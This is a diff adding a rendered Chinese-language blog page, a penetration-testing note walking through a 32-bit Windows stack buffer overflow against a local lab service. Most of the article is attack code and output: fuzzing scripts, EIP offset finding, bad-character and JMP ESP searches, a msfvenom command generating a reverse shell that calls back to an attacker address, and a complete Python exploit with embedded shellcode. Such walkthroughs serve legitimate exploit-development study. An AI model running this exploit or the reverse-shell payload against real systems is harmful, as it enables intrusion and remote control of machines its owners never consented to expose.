@@ -1,0 +1,509 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon-light.ico">
+  <link rel="icon" type="image/png" href="/img/favicon-light.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="渗透测试笔记、日常问题记录">
+  <meta name="author" content="Ayu">
+  <meta name="keywords" content="">
+  <title>Easy Windows Buffer Overflow - Black Book</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/dracula.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"0xhc.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Ayu's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/assets/blog/84707606_p0.webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Easy Windows Buffer Overflow">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-21 11:07" pubdate>
+        2020年11月21日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      971 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      18
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Easy Windows Buffer Overflow</h1>
+            
+            <div class="markdown-body">
+              <p>Easy Windows 32bit Buffer Overflow</p>
+<a id="more"></a>
+
+<ul>
+<li>Fuzz</li>
+<li>Find EIP(offset)</li>
+<li>Overwriting the EIP</li>
+<li>Find Bad Characters</li>
+<li>Find Return Address</li>
+<li>Exploit</li>
+</ul>
+<br/>
+
+<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><p>fuzz max</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&quot;print(&#x27;A&#x27; * 10000)&quot;</span> | nc 192.168.0.106 2233<br></code></pre></div></td></tr></table></figure>
+<p>缩小范围</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&quot;print(&#x27;A&#x27; * 2320)&quot;</span> | nc 192.168.0.106 2233<br>python3 -c <span class="hljs-string">&quot;print(&#x27;A&#x27; * 2318 + &#x27;B&#x27; * 4)&quot;</span> | nc 192.168.0.106 2233<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>可以编写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> socket<br><br><br>host = <span class="hljs-string">&quot;192.168.0.106&quot;</span><br>port = <span class="hljs-number">2233</span><br>size = <span class="hljs-number">100</span><br><br><span class="hljs-keyword">while</span> (size &lt; <span class="hljs-number">10000</span>):<br>    <span class="hljs-keyword">try</span>:<br>        data = <span class="hljs-string">&quot;A&quot;</span> * size<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[*] Connent...&quot;</span><br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.settimeout(<span class="hljs-number">8</span>)<br>        s.connect((host, port))<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Connect Done\n[*] Send buffer&quot;</span><br>        s.send(data)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Buffer size &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(size)<br>        <span class="hljs-comment"># print(&quot;[*] Buffer data : \n&#123;&#125;&quot;.format(data))</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Buffer send Done&quot;</span><br><br>        size += <span class="hljs-number">100</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>        s.close()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[!] Exit!&quot;</span><br>        sys.exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[!] Find it!&quot;</span><br>        print(<span class="hljs-string">&quot;[!]&quot;</span>, e)<br>        sys.exit(<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure>
+<p>Out</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-string">[*]</span> Connent...<br><span class="hljs-string">[*]</span> Connect Done<br><span class="hljs-string">[*]</span> Send buffer<br><span class="hljs-string">[*]</span> Buffer size <span class="hljs-number">2400</span><br><br><span class="hljs-string">[!]</span> Find it!<br><span class="hljs-string">[!]</span> timed <span class="hljs-keyword">out</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Find-EIP-Finding-the-Offset"><a href="#Find-EIP-Finding-the-Offset" class="headerlink" title="Find EIP (Finding the Offset)"></a>Find EIP (Finding the Offset)</h2><p><code>msf-pattern_create -l 2400</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -en <span class="hljs-string">&quot;Aa0Aa1Aa2Aa3Aa4A...Cz0Cz1Cz2Cz3&quot;</span> | nc 192.168.0.106 2233<br></code></pre></div></td></tr></table></figure>
+<p>EIP 被覆盖: <code>39794338</code> ， 得到 EIP 起始位置：2306</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ msf-pattern_offset -l 2400 -q 39794338<br>[*] Exact match at offset 2306<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Overwriting-the-EIP"><a href="#Overwriting-the-EIP" class="headerlink" title="Overwriting the EIP"></a>Overwriting the EIP</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> socket<br><br><br><span class="hljs-comment"># EIP start : 0x39794338</span><br>offset    = <span class="hljs-string">&quot;\x41&quot;</span> * <span class="hljs-number">2306</span><br>EIP       = <span class="hljs-string">&quot;\x42&quot;</span> * <span class="hljs-number">4</span><br>shellcode = offset + EIP<br><br>host = <span class="hljs-string">&quot;192.168.0.106&quot;</span><br>port = <span class="hljs-number">2233</span><br><br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[*] Connent...&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">3</span>)<br>    s.connect((host, port))<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Connect Done\n[*] Send buffer&quot;</span><br><br>    s.send(shellcode)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Buffer send Done&quot;</span><br><br>    s.close()<br><span class="hljs-keyword">except</span> KeyboardInterrupt:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[!] Exit!&quot;</span><br>    sys.exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[!] Error! \n[!] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>    sys.exit(<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure>
+<p>EIP 被 <code>BBBB</code> 覆盖: <code>42424242</code></p>
+<br/>
+
+<h2 id="Find-Bad-Characters"><a href="#Find-Bad-Characters" class="headerlink" title="Find Bad Characters"></a>Find Bad Characters</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">bad_chars = <span class="hljs-string">&quot;\x01...\xff&quot;</span><br>offset    = <span class="hljs-string">&#x27;\x41&#x27;</span> * <span class="hljs-number">2306</span><br>eip       = <span class="hljs-string">&#x27;\x42&#x27;</span> * <span class="hljs-number">4</span><br>shellcode = offset + eip + bad_chars<br></code></pre></div></td></tr></table></figure>
+<p>ESP: 0262EE54 -&gt; dump</p>
+<p>注意，检查 ESP 指向的内存区域的数据</p>
+<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">0262EE44 <span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41<span class="hljs-number"> 42 </span>42<span class="hljs-number"> 42 </span>42  AAAABBBB<br>0262EE4C <span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span>08  <br>0262EE54 <span class="hljs-number"> 09 </span>0A 0B 0C 0D 0E 0F<span class="hljs-number"> 10 </span> ....<br>0262EE5C <span class="hljs-number"> 11 </span>12<span class="hljs-number"> 13 </span>14<span class="hljs-number"> 15 </span>16<span class="hljs-number"> 17 </span>18  <br>0262EE64 <span class="hljs-number"> 19 </span>1A 1B 1C 1D 1E 1F<span class="hljs-number"> 20 </span> <br>0262EE6C <span class="hljs-number"> 21 </span>22<span class="hljs-number"> 23 </span>24<span class="hljs-number"> 25 </span>26<span class="hljs-number"> 27 </span>28  !&quot;<span class="hljs-comment">#$%&amp;&#x27;(</span><br>0262EE74 <span class="hljs-number"> 29 </span>2A 2B 2C 2D 2E 2F<span class="hljs-number"> 30 </span> )*+,-./0<br>0262EE7C <span class="hljs-number"> 31 </span>32<span class="hljs-number"> 33 </span>34<span class="hljs-number"> 35 </span>36<span class="hljs-number"> 37 </span>38  12345678<br>0262EE84 <span class="hljs-number"> 39 </span>3A 3B 3C 3D 3E 3F<span class="hljs-number"> 40 </span> 9:;&lt;=&gt;?@<br>0262EE8C <span class="hljs-number"> 41 </span>42<span class="hljs-number"> 43 </span>44<span class="hljs-number"> 45 </span>46<span class="hljs-number"> 47 </span>48  ABCDEFGH<br>0262EE94 <span class="hljs-number"> 49 </span>4A 4B 4C 4D 4E 4F<span class="hljs-number"> 50 </span> IJKLMNOP<br>0262EE9C <span class="hljs-number"> 00 </span>41<span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41  .AAAAAAA     &lt;- 51<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Find-Return-Address"><a href="#Find-Return-Address" class="headerlink" title="Find Return Address"></a>Find Return Address</h2><p><code>!mona modules</code> : 列出 modules</p>
+<p>ASM -&gt; HEX</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ msf-nasm_shell <br>nasm &gt; JMP ESP<br>00000000  FFE4              jmp esp<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>寻找：<code>JMP ESP</code></p>
+<p><code>!mona find -s &quot;\xff\xe4&quot; -m Server.exe</code></p>
+<p>or</p>
+<p><code>!mona jmp -r esp</code></p>
+<ul>
+<li>0x1120110D</li>
+</ul>
+<br/>
+
+<p>小端显示</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1120110D&quot;</span> | tac -rs .. | <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(tr -d &#x27;\n&#x27;)</span>&quot;</span><br><br><span class="hljs-comment"># 0D112011</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>生成 shellcode</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.0.100 <span class="hljs-attribute">LPORT</span>=443 <span class="hljs-attribute">EXITFUNC</span>=thread -b <span class="hljs-string">&quot;\x00\x51&quot;</span> -f c<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> socket<br><br><br><span class="hljs-comment"># msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b &quot;\x00\x51&quot; -f c</span><br>shellcode = (<br><span class="hljs-string">&quot;\xda\xd2\xb8\x2c\x1e\xdd\x7b\xd9\x74\x24\xf4\x5b\x31\xc9\xb1&quot;</span><br><span class="hljs-string">&quot;\x31\x31\x43\x18\x83\xc3\x04\x03\x43\x38\xfc\x28\x87\xa8\x82&quot;</span><br><span class="hljs-string">&quot;\xd3\x78\x28\xe3\x5a\x9d\x19\x23\x38\xd5\x09\x93\x4a\xbb\xa5&quot;</span><br><span class="hljs-string">&quot;\x58\x1e\x28\x3e\x2c\xb7\x5f\xf7\x9b\xe1\x6e\x08\xb7\xd2\xf1&quot;</span><br><span class="hljs-string">&quot;\x8a\xca\x06\xd2\xb3\x04\x5b\x13\xf4\x79\x96\x41\xad\xf6\x05&quot;</span><br><span class="hljs-string">&quot;\x76\xda\x43\x96\xfd\x90\x42\x9e\xe2\x60\x64\x8f\xb4\xfb\x3f&quot;</span><br><span class="hljs-string">&quot;\x0f\x36\x28\x34\x06\x20\x2d\x71\xd0\xdb\x85\x0d\xe3\x0d\xd4&quot;</span><br><span class="hljs-string">&quot;\xee\x48\x70\xd9\x1c\x90\xb4\xdd\xfe\xe7\xcc\x1e\x82\xff\x0a&quot;</span><br><span class="hljs-string">&quot;\x5d\x58\x75\x89\xc5\x2b\x2d\x75\xf4\xf8\xa8\xfe\xfa\xb5\xbf&quot;</span><br><span class="hljs-string">&quot;\x59\x1e\x4b\x13\xd2\x1a\xc0\x92\x35\xab\x92\xb0\x91\xf0\x41&quot;</span><br><span class="hljs-string">&quot;\xd8\x80\x5c\x27\xe5\xd3\x3f\x98\x43\x9f\xad\xcd\xf9\xc2\xbb&quot;</span><br><span class="hljs-string">&quot;\x10\x8f\x78\x89\x13\x8f\x82\xbd\x7b\xbe\x09\x52\xfb\x3f\xd8&quot;</span><br><span class="hljs-string">&quot;\x17\xe3\xdd\xc9\x6d\x8c\x7b\x98\xcc\xd1\x7b\x76\x12\xec\xff&quot;</span><br><span class="hljs-string">&quot;\x73\xea\x0b\x1f\xf6\xef\x50\xa7\xea\x9d\xc9\x42\x0d\x32\xe9&quot;</span><br><span class="hljs-string">&quot;\x46\x6e\xd5\x79\x0a\x5f\x70\xfa\xa9\x9f&quot;</span>)<br><br><br>host    = <span class="hljs-string">&quot;192.168.0.106&quot;</span><br>port    = <span class="hljs-number">2233</span><br><br>offset  = <span class="hljs-string">&quot;\x41&quot;</span> * <span class="hljs-number">2306</span><br>EIP     = <span class="hljs-string">&quot;\x0D\x11\x20\x11&quot;</span><br>nop     = <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">20</span><br>evilbuf = offset + EIP + nop + shellcode<br><br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[*] Connent...&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">5</span>)<br>    s.connect((host, port))<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Connect Done\n[*] Send buffer&quot;</span><br><br>    s.send(evilbuf)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Buffer send Done&quot;</span><br>    s.close()<br><span class="hljs-keyword">except</span> KeyboardInterrupt:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[!] Exit!&quot;</span><br>    sys.exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\n[!] Error! \n[!] &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(e)<br>    sys.exit(<span class="hljs-number">0</span>)<br><br></code></pre></div></td></tr></table></figure>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/BOF/">BOF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/30/13_25_pe_format_note/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PE Format Note</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/18/10_23_nfs_no_root_squash_remote_exploit/">
+                        <span class="hidden-mobile">NFS no_root_squash Remote Exploit Note</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
